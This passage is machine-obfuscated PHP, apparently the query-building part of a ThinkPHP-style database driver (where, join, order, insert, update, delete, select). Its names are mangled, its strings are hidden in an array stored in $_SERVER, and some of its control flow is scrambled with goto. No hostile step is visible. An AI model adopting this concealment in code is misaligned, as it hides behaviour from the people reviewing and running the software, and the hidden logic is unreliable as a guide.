$this->escapeString($c¶…¨Š¥íæ) . $Eˆ»É–‰ãñ[856]; } elseif (isset($c¶…¨Š¥íæ[0]) && is_string($c¶…¨Š¥íæ[0]) && strtolower($c¶…¨Š¥íæ[0]) == $Eˆ»É–‰ãñ[281]) { $c¶…¨Š¥íæ = $this->escapeString($c¶…¨Š¥íæ[1]); } elseif (is_array($c¶…¨Š¥íæ)) { $c¶…¨Š¥íæ = array_map(array($this, $Eˆ»É–‰ãñ[857]), $c¶…¨Š¥íæ); } elseif (is_bool($c¶…¨Š¥íæ)) { $c¶…¨Š¥íæ = $c¶…¨Š¥íæ ? $Eˆ»É–‰ãñ[83] : $Eˆ»É–‰ãñ[472]; } elseif (is_null($c¶…¨Š¥íæ)) { $c¶…¨Š¥íæ = $Eˆ»É–‰ãñ[99]; } return $c¶…¨Š¥íæ; } protected function parseField($dà¹’›´ØÑ) { $FåÏ•ˆ£à¸ =& $_SERVER[Ä¿Ş°¨]; if (is_string($dà¹’›´ØÑ) && strpos($dà¹’›´ØÑ, $FåÏ•ˆ£à¸[47])) { $dà¹’›´ØÑ = explode($FåÏ•ˆ£à¸[47], $dà¹’›´ØÑ); } if (is_array($dà¹’›´ØÑ)) { $f÷¹…ÅÆÅ  = array(); foreach ($dà¹’›´ØÑ as $A‹ãÔ‹Û => $CÍ÷·³İ) { if (!is_numeric($A‹ãÔ‹Û)) { $f÷¹…ÅÆÅ [] = $this->parseKey($A‹ãÔ‹Û) . $FåÏ•ˆ£à¸[898] . $this->parseKey($CÍ÷·³İ); } else { $f÷¹…ÅÆÅ [] = $this->parseKey($CÍ÷·³İ); } } $dÉ±‰Á¾í‚ = implode($FåÏ•ˆ£à¸[47], $f÷¹…ÅÆÅ ); } elseif (is_string($dà¹’›´ØÑ) && !empty($dà¹’›´ØÑ)) { $dÉ±‰Á¾í‚ = $dà¹’›´ØÑ; } else { $dÉ±‰Á¾í‚ = $FåÏ•ˆ£à¸[172]; } return $dÉ±‰Á¾í‚; } protected function parseTable($eŒŠ±”˜¡â) { $CØÙóõªŞƒ =& $_SERVER[Ä¿Ş°¨]; if (is_array($eŒŠ±”˜¡â)) { $eóËÒœäé = array(); foreach ($eŒŠ±”˜¡â as $a¸ö¨³èÊ => $BÇîïºí“) { if (!is_numeric($a¸ö¨³èÊ)) { $eóËÒœäé[] = $this->parseKey($a¸ö¨³èÊ) . $CØÙóõªŞƒ[50] . $this->parseKey($BÇîïºí“); } else { $eóËÒœäé[] = $this->parseKey($a¸ö¨³èÊ); } } $eŒŠ±”˜¡â = $eóËÒœäé; } elseif (is_string($eŒŠ±”˜¡â)) { if (strstr($eŒŠ±”˜¡â, $CØÙóõªŞƒ[50])) { return $eŒŠ±”˜¡â; } $eŒŠ±”˜¡â = explode($CØÙóõªŞƒ[47], $eŒŠ±”˜¡â); array_walk($eŒŠ±”˜¡â, array($this, $CØÙóõªŞƒ[805])); } return $CØÙóõªŞƒ[899] . trim(implode($CØÙóõªŞƒ[900], $eŒŠ±”˜¡â), $CØÙóõªŞƒ[811]) . $CØÙóõªŞƒ[899]; } protected function parseWhere($dö§¥Úë±Ò) { $B¥¡¶ˆ’øÛ =& $_SERVER[Ä¿Ş°¨]; $c†ÃÄ¹ğ›Î = $B¥¡¶ˆ’øÛ[33]; if (is_string($dö§¥Úë±Ò)) { $c†ÃÄ¹ğ›Î = $dö§¥Úë±Ò; } else { $aèãë¹¡êÆ = isset($dö§¥Úë±Ò[$B¥¡¶ˆ’øÛ[901]]) ? strtoupper($dö§¥Úë±Ò[$B¥¡¶ˆ’øÛ[901]]) : $B¥¡¶ˆ’øÛ[33]; if (in_array($aèãë¹¡êÆ, array($B¥¡¶ˆ’øÛ[902], $B¥¡¶ˆ’øÛ[903], $B¥¡¶ˆ’øÛ[904]))) { $aèãë¹¡êÆ = $B¥¡¶ˆ’øÛ[50] . $aèãë¹¡êÆ . $B¥¡¶ˆ’øÛ[50]; unset($dö§¥Úë±Ò[$B¥¡¶ˆ’øÛ[901]]); } else { $aèãë¹¡êÆ = $B¥¡¶ˆ’øÛ[905]; } foreach ($dö§¥Úë±Ò as $dÛÏ‡óò‡½ => $AŒŞí„ÕÇé) { $c†ÃÄ¹ğ›Î .= $B¥¡¶ˆ’øÛ[261]; if (is_numeric($dÛÏ‡óò‡½)) { $dÛÏ‡óò‡½ = $B¥¡¶ˆ’øÛ[906]; } if (0 === strpos($dÛÏ‡óò‡½, $B¥¡¶ˆ’øÛ[70])) { $c†ÃÄ¹ğ›Î .= $this->parseThinkWhere($dÛÏ‡óò‡½, $AŒŞí„ÕÇé); } else { if (!preg_match($B¥¡¶ˆ’øÛ[907], trim($dÛÏ‡óò‡½))) { think_exception(think_lang($B¥¡¶ˆ’øÛ[908]) . $B¥¡¶ˆ’øÛ[4] . $dÛÏ‡óò‡½); } $f±šÓÌù© = is_array($AŒŞí„ÕÇé) && isset($AŒŞí„ÕÇé[$B¥¡¶ˆ’øÛ[909]]); $dÛÏ‡óò‡½ = trim($dÛÏ‡óò‡½); if (strpos($dÛÏ‡óò‡½, $B¥¡¶ˆ’øÛ[267])) { $D‰á°ƒÙÌ½ = explode($B¥¡¶ˆ’øÛ[267], $dÛÏ‡óò‡½); $Cß½İßÉ“¿ = array(); foreach ($D‰á°ƒÙÌ½ as $a¥Ç™¦º‰ê => $FœìÍô¢Ú) { $Bå£ß“ñ = $f±šÓÌù© ? $AŒŞí„ÕÇé[$a¥Ç™¦º‰ê] : $AŒŞí„ÕÇé; $Cß½İßÉ“¿[] = $B¥¡¶ˆ’øÛ[244] . $this->parseWhereItem($this->parseKey($FœìÍô¢Ú), $Bå£ß“ñ) . $B¥¡¶ˆ’øÛ[804]; } $c†ÃÄ¹ğ›Î .= implode($B¥¡¶ˆ’øÛ[910], $Cß½İßÉ“¿); } elseif (strpos($dÛÏ‡óò‡½, $B¥¡¶ˆ’øÛ[268])) { $D‰á°ƒÙÌ½ = explode($B¥¡¶ˆ’øÛ[268], $dÛÏ‡óò‡½); $Cß½İßÉ“¿ = array(); foreach ($D‰á°ƒÙÌ½ as $a¥Ç™¦º‰ê => $FœìÍô¢Ú) { $Bå£ß“ñ = $f±šÓÌù© ? $AŒŞí„ÕÇé[$a¥Ç™¦º‰ê] : $AŒŞí„ÕÇé; $Cß½İßÉ“¿[] = $B¥¡¶ˆ’øÛ[244] . $this->parseWhereItem($this->parseKey($FœìÍô¢Ú), $Bå£ß“ñ) . $B¥¡¶ˆ’øÛ[804]; } $c†ÃÄ¹ğ›Î .= implode($B¥¡¶ˆ’øÛ[905], $Cß½İßÉ“¿); } else { $c†ÃÄ¹ğ›Î .= $this->parseWhereItem($this->parseKey($dÛÏ‡óò‡½), $AŒŞí„ÕÇé); } } $c†ÃÄ¹ğ›Î .= $B¥¡¶ˆ’øÛ[262] . $aèãë¹¡êÆ; } $c†ÃÄ¹ğ›Î = substr($c†ÃÄ¹ğ›Î, 0, -strlen($aèãë¹¡êÆ)); } return empty($c†ÃÄ¹ğ›Î) ? $B¥¡¶ˆ’øÛ[33] : $B¥¡¶ˆ’øÛ[911] . $c†ÃÄ¹ğ›Î; } protected function parseWhereItem($A½­‘ËğĞë, $EôâÒ÷ßĞè) { $Aâ˜˜‹ŠÑŸ =& $_SERVER[Ä¿Ş°¨]; $B˜Î…óãÜÂ = $Aâ˜˜‹ŠÑŸ[33]; if (is_array($EôâÒ÷ßĞè)) { if (is_string($EôâÒ÷ßĞè[0])) { $BÛù‚”…åí = strtolower($EôâÒ÷ßĞè[0]); if (in_array($EôâÒ÷ßĞè[0], array($Aâ˜˜‹ŠÑŸ[894], $Aâ˜˜‹ŠÑŸ[912], $Aâ˜˜‹ŠÑŸ[913], $Aâ˜˜‹ŠÑŸ[914], $Aâ˜˜‹ŠÑŸ[915], $Aâ˜˜‹ŠÑŸ[916]))) { $B˜Î…óãÜÂ .= $A½­‘ËğĞë . $Aâ˜˜‹ŠÑŸ[50] . $EôâÒ÷ßĞè[0] . $Aâ˜˜‹ŠÑŸ[50] . $this->parseValue($EôâÒ÷ßĞè[1]); } elseif (preg_match($Aâ˜˜‹ŠÑŸ[917], $EôâÒ÷ßĞè[0])) { $B˜Î…óãÜÂ .= $A½­‘ËğĞë . $Aâ˜˜‹ŠÑŸ[50] . $this->exp[$BÛù‚”…åí] . $Aâ˜˜‹ŠÑŸ[50] . $this->parseValue($EôâÒ÷ßĞè[1]); } elseif (preg_match($Aâ˜˜‹ŠÑŸ[918], $EôâÒ÷ßĞè[0])) { if (is_array($EôâÒ÷ßĞè[1])) { $B½ÑÌù¥Şì = isset($EôâÒ÷ßĞè[2]) ? strtoupper($EôâÒ÷ßĞè[2]) : $Aâ˜˜‹ŠÑŸ[903]; if (in_array($B½ÑÌù¥Şì, array($Aâ˜˜‹ŠÑŸ[902], $Aâ˜˜‹ŠÑŸ[903], $Aâ˜˜‹ŠÑŸ[904]))) { $Aã™ØŞ¼Ñ = array(); foreach ($EôâÒ÷ßĞè[1] as $d†¡ÛŞ¡É¶) { $Aã™ØŞ¼Ñ[] = $A½­‘ËğĞë . $Aâ˜˜‹ŠÑŸ[50] . $this->exp[$BÛù‚”…åí] . $Aâ˜˜‹ŠÑŸ[50] . $this->parseValue($d†¡ÛŞ¡É¶); } $B˜Î…óãÜÂ .= $Aâ˜˜‹ŠÑŸ[244] . implode($Aâ˜˜‹ŠÑŸ[50] . $B½ÑÌù¥Şì . $Aâ˜˜‹ŠÑŸ[50], $Aã™ØŞ¼Ñ) . $Aâ˜˜‹ŠÑŸ[804]; } } else { $B˜Î…óãÜÂ .= $A½­‘ËğĞë . $Aâ˜˜‹ŠÑŸ[50] . $this->exp[$BÛù‚”…åí] . $Aâ˜˜‹ŠÑŸ[50] . $this->parseValue($EôâÒ÷ßĞè[1]); } } elseif ($Aâ˜˜‹ŠÑŸ[281] == $BÛù‚”…åí) { $B˜Î…óãÜÂ .= $Aâ˜˜‹ŠÑŸ[802] . $A½­‘ËğĞë . $Aâ˜˜‹ŠÑŸ[50] . $EôâÒ÷ßĞè[1] . $Aâ˜˜‹ŠÑŸ[919]; } elseif (preg_match($Aâ˜˜‹ŠÑŸ[920], $EôâÒ÷ßĞè[0])) { if (isset($EôâÒ÷ßĞè[2]) && $Aâ˜˜‹ŠÑŸ[281] == $EôâÒ÷ßĞè[2]) { $B˜Î…óãÜÂ .= $A½­‘ËğĞë . $Aâ˜˜‹ŠÑŸ[50] . $this->exp[$BÛù‚”…åí] . $Aâ˜˜‹ŠÑŸ[50] . $EôâÒ÷ßĞè[1]; } else { if (is_string($EôâÒ÷ßĞè[1])) { $EôâÒ÷ßĞè[1] = explode($Aâ˜˜‹ŠÑŸ[47], $EôâÒ÷ßĞè[1]); } $e¨…ø¦¹µô = implode($Aâ˜˜‹ŠÑŸ[47], $this->parseValue($EôâÒ÷ßĞè[1])); $B˜Î…óãÜÂ .= $A½­‘ËğĞë . $Aâ˜˜‹ŠÑŸ[50] . $this->exp[$BÛù‚”…åí] . $Aâ˜˜‹ŠÑŸ[802] . $e¨…ø¦¹µô . $Aâ˜˜‹ŠÑŸ[804]; } } elseif (preg_match($Aâ˜˜‹ŠÑŸ[921], $EôâÒ÷ßĞè[0])) { $Fîêùß±Û = is_string($EôâÒ÷ßĞè[1]) ? explode($Aâ˜˜‹ŠÑŸ[47], $EôâÒ÷ßĞè[1]) : $EôâÒ÷ßĞè[1]; $B˜Î…óãÜÂ .= $Aâ˜˜‹ŠÑŸ[802] . $A½­‘ËğĞë . $Aâ˜˜‹ŠÑŸ[50] . $this->exp[$BÛù‚”…åí] . $Aâ˜˜‹ŠÑŸ[50] . $this->parseValue($Fîêùß±Û[0]) . $Aâ˜˜‹ŠÑŸ[905] . $this->parseValue($Fîêùß±Û[1]) . $Aâ˜˜‹ŠÑŸ[262]; } else { think_exception(think_lang($Aâ˜˜‹ŠÑŸ[908]) . $Aâ˜˜‹ŠÑŸ[4] . $EôâÒ÷ßĞè[0]); } } else { $C†ğçÖ´¹Û = count($EôâÒ÷ßĞè); $E±Ğ»Â«ŞÖ = isset($EôâÒ÷ßĞè[$C†ğçÖ´¹Û - 1]) ? strtoupper($EôâÒ÷ßĞè[$C†ğçÖ´¹Û - 1]) : $Aâ˜˜‹ŠÑŸ[33]; if (in_array($E±Ğ»Â«ŞÖ, array($Aâ˜˜‹ŠÑŸ[902], $Aâ˜˜‹ŠÑŸ[903], $Aâ˜˜‹ŠÑŸ[904]))) { $C†ğçÖ´¹Û = $C†ğçÖ´¹Û - 1; } else { $E±Ğ»Â«ŞÖ = $Aâ˜˜‹ŠÑŸ[902]; } for ($b‹‘˜ÁÙÀ­ = 0; $b‹‘˜ÁÙÀ­ < $C†ğçÖ´¹Û; $b‹‘˜ÁÙÀ­++) { $Fîêùß±Û = is_array($EôâÒ÷ßĞè[$b‹‘˜ÁÙÀ­]) ? $EôâÒ÷ßĞè[$b‹‘˜ÁÙÀ­][1] : $EôâÒ÷ßĞè[$b‹‘˜ÁÙÀ­]; if ($Aâ˜˜‹ŠÑŸ[281] == strtolower($EôâÒ÷ßĞè[$b‹‘˜ÁÙÀ­][0])) { $B˜Î…óãÜÂ .= $Aâ˜˜‹ŠÑŸ[244] . $A½­‘ËğĞë . $Aâ˜˜‹ŠÑŸ[50] . $Fîêùß±Û . $Aâ˜˜‹ŠÑŸ[919] . $E±Ğ»Â«ŞÖ . $Aâ˜˜‹ŠÑŸ[50]; } else { $D³œöÔ“¢ˆ = is_array($EôâÒ÷ßĞè[$b‹‘˜ÁÙÀ­]) ? $this->exp[strtolower($EôâÒ÷ßĞè[$b‹‘˜ÁÙÀ­][0])] : $Aâ˜˜‹ŠÑŸ[894]; if (!$D³œöÔ“¢ˆ && is_array($EôâÒ÷ßĞè[$b‹‘˜ÁÙÀ­]) && in_array($EôâÒ÷ßĞè[$b‹‘˜ÁÙÀ­][0], array($Aâ˜˜‹ŠÑŸ[894], $Aâ˜˜‹ŠÑŸ[912], $Aâ˜˜‹ŠÑŸ[913], $Aâ˜˜‹ŠÑŸ[914], $Aâ˜˜‹ŠÑŸ[915], $Aâ˜˜‹ŠÑŸ[916]))) { $D³œöÔ“¢ˆ = $EôâÒ÷ßĞè[$b‹‘˜ÁÙÀ­][0]; } $B˜Î…óãÜÂ .= $Aâ˜˜‹ŠÑŸ[244] . $A½­‘ËğĞë . $Aâ˜˜‹ŠÑŸ[50] . $D³œöÔ“¢ˆ . $Aâ˜˜‹ŠÑŸ[50] . $this->parseValue($Fîêùß±Û) . $Aâ˜˜‹ŠÑŸ[919] . $E±Ğ»Â«ŞÖ . $Aâ˜˜‹ŠÑŸ[50]; } } $B˜Î…óãÜÂ = substr($B˜Î…óãÜÂ, 0, -4); } } else { $B˜Î…óãÜÂ .= $A½­‘ËğĞë . $Aâ˜˜‹ŠÑŸ[922] . $this->parseValue($EôâÒ÷ßĞè); } return $B˜Î…óãÜÂ; } protected function parseThinkWhere($bÔ³¾¶åï, $B¨ğ’Í‰Ò“) { $b‡®‘–¤Û =& $_SERVER[Ä¿Ş°¨]; $C’ÓÍ”ÎÈ· = $b‡®‘–¤Û[33]; switch ($bÔ³¾¶åï) { case $b‡®‘–¤Û[335]: $C’ÓÍ”ÎÈ· = $B¨ğ’Í‰Ò“; break; case $b‡®‘–¤Û[906]: $C’ÓÍ”ÎÈ· = is_string($B¨ğ’Í‰Ò“) ? $B¨ğ’Í‰Ò“ : substr($this->parseWhere($B¨ğ’Í‰Ò“), 6); break; case $b‡®‘–¤Û[923]: parse_str($B¨ğ’Í‰Ò“, $EÖôŞ×áÇÉ); if (isset($EÖôŞ×áÇÉ[$b‡®‘–¤Û[901]])) { $eŠª…½¿ôâ = $b‡®‘–¤Û[50] . strtoupper($EÖôŞ×áÇÉ[$b‡®‘–¤Û[901]]) . $b‡®‘–¤Û[50]; unset($EÖôŞ×áÇÉ[$b‡®‘–¤Û[901]]); } else { $eŠª…½¿ôâ = $b‡®‘–¤Û[905]; } $AÁÌ·à–İ = array(); foreach ($EÖôŞ×áÇÉ as $AŠ Ó·‘Í => $aŠšä‹†Û») { $AÁÌ·à–İ[] = $this->parseKey($AŠ Ó·‘Í) . $b‡®‘–¤Û[922] . $this->parseValue($aŠšä‹†Û»); } $C’ÓÍ”ÎÈ· = implode($eŠª…½¿ôâ, $AÁÌ·à–İ); break; } return $C’ÓÍ”ÎÈ·; } protected function parseLimit($c…Å×ö‰Ï) { $A­‡šñŠÚ– =& $_SERVER[Ä¿Ş°¨]; return !empty($c…Å×ö‰Ï) ? $A­‡šñŠÚ–[48] . $c…Å×ö‰Ï . $A­‡šñŠÚ–[50] : $A­‡šñŠÚ–[33]; } protected function parseJoin($E§ïåª¨È) { $DÅß´—†è =& $_SERVER[Ä¿Ş°¨]; $eÏ½Šêª = $DÅß´—†è[33]; if (!empty($E§ïåª¨È)) { if (is_array($E§ïåª¨È)) { foreach ($E§ïåª¨È as $eëóÆáÑ«¦ => $DÅ«æèæ°ë) { if (!1 !== stripos($DÅ«æèæ°ë, $DÅß´—†è[924])) { $eÏ½Šêª .= $DÅß´—†è[50] . $DÅ«æèæ°ë; } else { $eÏ½Šêª .= $DÅß´—†è[925] . $DÅ«æèæ°ë; } } } else { $eÏ½Šêª .= $DÅß´—†è[925] . $E§ïåª¨È; } } $eÏ½Šêª = preg_replace($DÅß´—†è[926], think_config($DÅß´—†è[829]) . $DÅß´—†è[927], $eÏ½Šêª); return $eÏ½Šêª; } protected function parseOrder($cåÚ‡ÍÛ’) { $FŞšƒ«õí“ =& $_SERVER[Ä¿Ş°¨]; if (is_array($cåÚ‡ÍÛ’)) { $D¯•’¿¢Ë¤ = array(); foreach ($cåÚ‡ÍÛ’ as $Déç—òƒªŒ => $b÷ŒŞ…ò°š) { if (is_numeric($Déç—òƒªŒ)) { $D¯•’¿¢Ë¤[] = $this->parseKey($b÷ŒŞ…ò°š); } else { $b÷ŒŞ…ò°š = in_array(strtoupper(trim($b÷ŒŞ…ò°š)), array($FŞšƒ«õí“[928], $FŞšƒ«õí“[929])) ? $FŞšƒ«õí“[50] . $b÷ŒŞ…ò°š : $FŞšƒ«õí“[33]; if (preg_match($FŞšƒ«õí“[930], $Déç—òƒªŒ)) { $D¯•’¿¢Ë¤[] = $this->parseKey($Déç—òƒªŒ) . $b÷ŒŞ…ò°š; } else { think_exception($FŞšƒ«õí“[931] . $Déç—òƒªŒ); } } } $cåÚ‡ÍÛ’ = implode($FŞšƒ«õí“[47], $D¯•’¿¢Ë¤); } return !empty($cåÚ‡ÍÛ’) ? $FŞšƒ«õí“[932] . $cåÚ‡ÍÛ’ : $FŞšƒ«õí“[33]; } protected function parseGroup($FÓŸ‹·âÉ´) { $a¤ö—½¿× =& $_SERVER[Ä¿Ş°¨]; return !empty($FÓŸ‹·âÉ´) ? $a¤ö—½¿×[933] . $FÓŸ‹·âÉ´ : $a¤ö—½¿×[33]; } protected function parseHaving($F‘„çÂìµ×) { $eÍÉÔ¬Âç =& $_SERVER[Ä¿Ş°¨]; return !empty($F‘„çÂìµ×) ? $eÍÉÔ¬Âç[934] . $F‘„çÂìµ× : $eÍÉÔ¬Âç[33]; } protected function parseComment($F¼¿øã¸Àµ) { $C‘Û²â‰…Ñ =& $_SERVER[Ä¿Ş°¨]; return !empty($F¼¿øã¸Àµ) ? $C‘Û²â‰…Ñ[935] . $F¼¿øã¸Àµ . $C‘Û²â‰…Ñ[936] : $C‘Û²â‰…Ñ[33]; } protected function parseDistinct($DŸ¦´®øå¬) { $FÅÔÎªƒŸ =& $_SERVER[Ä¿Ş°¨]; return !empty($DŸ¦´®øå¬) ? $FÅÔÎªƒŸ[937] : $FÅÔÎªƒŸ[33]; } protected function parseUnion($d„Ô™Ş£) { $AîÊÓÉÒ®È =& $_SERVER[Ä¿Ş°¨]; if (empty($d„Ô™Ş£)) { return $AîÊÓÉÒ®È[33]; } if (isset($d„Ô™Ş£[$AîÊÓÉÒ®È[332]])) { $B„â‚›æ‘ = $AîÊÓÉÒ®È[938]; unset($d„Ô™Ş£[$AîÊÓÉÒ®È[332]]); } else { $B„â‚›æ‘ = $AîÊÓÉÒ®È[939]; } foreach ($d„Ô™Ş£ as $F±ø´ÂœŒ—) { $eÖ•Å›¿[] = $B„â‚›æ‘ . (is_array($F±ø´ÂœŒ—) ? $this->buildSelectSql($F±ø´ÂœŒ—) : $F±ø´ÂœŒ—); } return implode($AîÊÓÉÒ®È[50], $eÖ•Å›¿); } public function insert($fÃ‚Úöå™Ä, $cƒË¸Ó×©À = array(), $ağí©ºÄ±Ï = false) { goto cÙÕò‹¶Š¶; Eì«©ªÄÚ: $d®±º©ÔÉÛ .= $this->parseComment(!empty($cƒË¸Ó×©À[$f“èñÜ…áë[337]]) ? $cƒË¸Ó×©À[$f“èñÜ…áë[337]] : $f“èñÜ…áë[33]); return $this->execute($d®±º©ÔÉÛ, $this->parseBind(!empty($cƒË¸Ó×©À[$f“èñÜ…áë[269]]) ? $cƒË¸Ó×©À[$f“èñÜ…áë[269]] : array())); goto F„ÎËé¡Ö; cÙÕò‹¶Š¶: $f“èñÜ…áë =& $_SERVER[Ä¿Ş°¨]; $DøÚñ½èÛ = $Aƒ®Ü•†Úà = array(); $this->model = $cƒË¸Ó×©À[$f“èñÜ…áë[265]]; goto cÌ‰­Š¹; cÌ‰­Š¹: foreach ($fÃ‚Úöå™Ä as $D…Ç•¥Ÿ¨² => $b”ÃŸ†æ„) { if (is_array($b”ÃŸ†æ„) && $f“èñÜ…áë[281] == $b”ÃŸ†æ„[0]) { $Aƒ®Ü•†Úà[] = $this->parseKey($D…Ç•¥Ÿ¨²); $DøÚñ½èÛ[] = $b”ÃŸ†æ„[1]; } elseif (is_scalar($b”ÃŸ†æ„) || is_null($b”ÃŸ†æ„)) { $Aƒ®Ü•†Úà[] = $this->parseKey($D…Ç•¥Ÿ¨²); $DøÚñ½èÛ[] = $this->parseValue($b”ÃŸ†æ„); } } $d®±º©ÔÉÛ = ($ağí©ºÄ±Ï ? $f“èñÜ…áë[806] : $f“èñÜ…áë[807]) . $f“èñÜ…áë[808] . $this->parseTable($cƒË¸Ó×©À[$f“èñÜ…áë[263]]) . $f“èñÜ…áë[802] . implode($f“èñÜ…áë[47], $Aƒ®Ü•†Úà) . $f“èñÜ…áë[803] . implode($f“èñÜ…áë[47], $DøÚñ½èÛ) . $f“èñÜ…áë[804]; $d®±º©ÔÉÛ .= $this->parseLock(isset($cƒË¸Ó×©À[$f“èñÜ…áë[764]]) ? $cƒË¸Ó×©À[$f“èñÜ…áë[764]] : !1); goto Eì«©ªÄÚ; F„ÎËé¡Ö: } public function selectInsert($Bä‹¡¦†²ù, $E­òÃÉ£¨…, $CÉ°¿Òœ‡ = array()) { goto C»İİÎ…‡„; f½Ç°ÒöÌœ: return $this->execute($a¦ÏÖç è°, $this->parseBind(!empty($CÉ°¿Òœ‡[$b‰±´©øÉ£[269]]) ? $CÉ°¿Òœ‡[$b‰±´©øÉ£[269]] : array())); goto dÕ×¼…Á¥; C»İİÎ…‡„: $b‰±´©øÉ£ =& $_SERVER[Ä¿Ş°¨]; $this->model = $CÉ°¿Òœ‡[$b‰±´©øÉ£[265]]; if (is_string($Bä‹¡¦†²ù)) { $Bä‹¡¦†²ù = explode($b‰±´©øÉ£[47], $Bä‹¡¦†²ù); } goto B·éÈ¦¥ãÑ; B·éÈ¦¥ãÑ: array_walk($Bä‹¡¦†²ù, array($this, $b‰±´©øÉ£[805])); $a¦ÏÖç è° = $b‰±´©øÉ£[940] . $this->parseTable($E­òÃÉ£¨…) . $b‰±´©øÉ£[802] . implode($b‰±´©øÉ£[47], $Bä‹¡¦†²ù) . $b‰±´©øÉ£[919]; $a¦ÏÖç è° .= $this->buildSelectSql($CÉ°¿Òœ‡); goto f½Ç°ÒöÌœ; dÕ×¼…Á¥: } public function update($d±·™ê‘Œ÷, $AÕÄ†ß”Šç) { $BÏ‚è”©ó =& $_SERVER[Ä¿Ş°¨]; $this->model = $AÕÄ†ß”Šç[$BÏ‚è”©ó[265]]; $fóš³–•¥£ = $BÏ‚è”©ó[941] . $this->parseTable($AÕÄ†ß”Šç[$BÏ‚è”©ó[263]]) . $this->parseSet($d±·™ê‘Œ÷) . $this->parseWhere(!empty($AÕÄ†ß”Šç[$BÏ‚è”©ó[259]]) ? $AÕÄ†ß”Šç[$BÏ‚è”©ó[259]] : $BÏ‚è”©ó[33]) . $this->parseOrder(!empty($AÕÄ†ß”Šç[$BÏ‚è”©ó[346]]) ? $AÕÄ†ß”Šç[$BÏ‚è”©ó[346]] : $BÏ‚è”©ó[33]) . $this->parseLimit(!empty($AÕÄ†ß”Šç[$BÏ‚è”©ó[276]]) ? $AÕÄ†ß”Šç[$BÏ‚è”©ó[276]] : $BÏ‚è”©ó[33]) . $this->parseLock(isset($AÕÄ†ß”Šç[$BÏ‚è”©ó[764]]) ? $AÕÄ†ß”Šç[$BÏ‚è”©ó[764]] : !1) . $this->parseComment(!empty($AÕÄ†ß”Šç[$BÏ‚è”©ó[337]]) ? $AÕÄ†ß”Šç[$BÏ‚è”©ó[337]] : $BÏ‚è”©ó[33]); return $this->execute($fóš³–•¥£, $this->parseBind(!empty($AÕÄ†ß”Šç[$BÏ‚è”©ó[269]]) ? $AÕÄ†ß”Šç[$BÏ‚è”©ó[269]] : array())); } public function delete($Eø±ÔÆ¬¾ = array()) { $Fæ‹Âó³ä’ =& $_SERVER[Ä¿Ş°¨]; $this->model = $Eø±ÔÆ¬¾[$Fæ‹Âó³ä’[265]]; $d­íã¿Ú¨³ = $Fæ‹Âó³ä’[942] . $this->parseTable($Eø±ÔÆ¬¾[$Fæ‹Âó³ä’[263]]) . $this->parseWhere(!empty($Eø±ÔÆ¬¾[$Fæ‹Âó³ä’[259]]) ? $Eø±ÔÆ¬¾[$Fæ‹Âó³ä’[259]] : $Fæ‹Âó³ä’[33]) . $this->parseOrder(!empty($Eø±ÔÆ¬¾[$Fæ‹Âó³ä’[346]]) ? $Eø±ÔÆ¬¾[$Fæ‹Âó³ä’[346]] : $Fæ‹Âó³ä’[33]) . $this->parseLimit(!empty($Eø±ÔÆ¬¾[$Fæ‹Âó³ä’[276]]) ? $Eø±ÔÆ¬¾[$Fæ‹Âó³ä’[276]] : $Fæ‹Âó³ä’[33]) . $this->parseLock(isset($Eø±ÔÆ¬¾[$Fæ‹Âó³ä’[764]]) ? $Eø±ÔÆ¬¾[$Fæ‹Âó³ä’[764]] : !1) . $this->parseComment(!empty($Eø±ÔÆ¬¾[$Fæ‹Âó³ä’[337]]) ? $Eø±ÔÆ¬¾[$Fæ‹Âó³ä’[337]] : $Fæ‹Âó³ä’[33]); return $this->execute($d­íã¿Ú¨³, $this->parseBind(!empty($Eø±ÔÆ¬¾[$Fæ‹Âó³ä’[269]]) ? $Eø±ÔÆ¬¾[$Fæ‹Âó³ä’[269]] : array())); } public function select($Bäò¨¬¡İ® = array()) { goto D¼†£Œ‘¸ ; dÌ‡ìĞÂ„: $f‰ìÚ¼£Ñó = isset($Bäò¨¬¡İ®[$f®’ë‡ĞÜÓ[333]]) ? $Bäò¨¬¡İ®[$f®’ë‡ĞÜÓ[333]] : !1; if ($f‰ìÚ¼£Ñó) { $E¤‚ˆÛƒ· = is_string($f‰ìÚ¼£Ñó[$f®’ë‡ĞÜÓ[89]]) ? $f‰ìÚ¼£Ñó[$f®’ë‡ĞÜÓ[89]] : $f®’ë‡ĞÜÓ[943] . md5($dòï‡ô×Ô); $E¾èİÄƒä› = think_cache($E¤‚ˆÛƒ·, $f®’ë‡ĞÜÓ[33], $f‰ìÚ¼£Ñó); if (!1 !== $E¾èİÄƒä›) { return $E¾èİÄƒä›; } } $Eââ»­¾› = $this->query($dòï‡ô×Ô, $this->parseBind(!empty($Bäò¨¬¡İ®[$f®’ë‡ĞÜÓ[269]]) ? $Bäò¨¬¡İ®[$f®’ë‡ĞÜÓ[269]] : array())); goto CÔ…‚„¿É; CÔ…‚„¿É: if ($f‰ìÚ¼£Ñó && !1 !== $Eââ»­¾›) { think_cache($E¤‚ˆÛƒ·, $Eââ»­¾›, $f‰ìÚ¼£Ñó); } return $Eââ»­¾›; goto A›‘ÀÔ‡Ò˜; D¼†£Œ‘¸ : $f®’ë‡ĞÜÓ =& $_SERVER[Ä¿Ş°¨]; $this->model = $Bäò¨¬¡İ®[$f®’ë‡ĞÜÓ[265]]; $dòï‡ô×Ô = $this->buildSelectSql($Bäò¨¬¡İ®); goto dÌ‡ìĞÂ„; A›‘ÀÔ‡Ò˜: } public function buildSelectSql($AÔÈ²‘èÊ = array()) { goto bµµĞ¤’è„; CÒ ¿×¥øÕ: return $Fƒ†© Œ‡; goto CÁé°İ¶š®; bµµĞ¤’è„: $EÕÛÆÌñƒ =& $_SERVER[Ä¿Ş°¨]; if (isset($AÔÈ²‘èÊ[$EÕÛÆÌñƒ[336]])) { if (strpos($AÔÈ²‘èÊ[$EÕÛÆÌñƒ[336]], $EÕÛÆÌñƒ[47])) { list($DöõñËäµ¨, $aß­˜¦‹Ö) = explode($EÕÛÆÌñƒ[47], $AÔÈ²‘èÊ[$EÕÛÆÌñƒ[336]]); } else { $DöõñËäµ¨ = $AÔÈ²‘èÊ[$EÕÛÆÌñƒ[336]]; } $DöõñËäµ¨ = $DöõñËäµ¨ ? $DöõñËäµ¨ : 1; $aß­˜¦‹Ö = isset($aß­˜¦‹Ö) ? $aß­˜¦‹Ö : (is_numeric($AÔÈ²‘èÊ[$EÕÛÆÌñƒ[276]]) ? $AÔÈ²‘èÊ[$EÕÛÆÌñƒ[276]] : 20); $fÕ¥Ü±Œª = $aß­˜¦‹Ö * ((int) $DöõñËäµ¨ - 1); $AÔÈ²‘èÊ[$EÕÛÆÌñƒ[276]] = 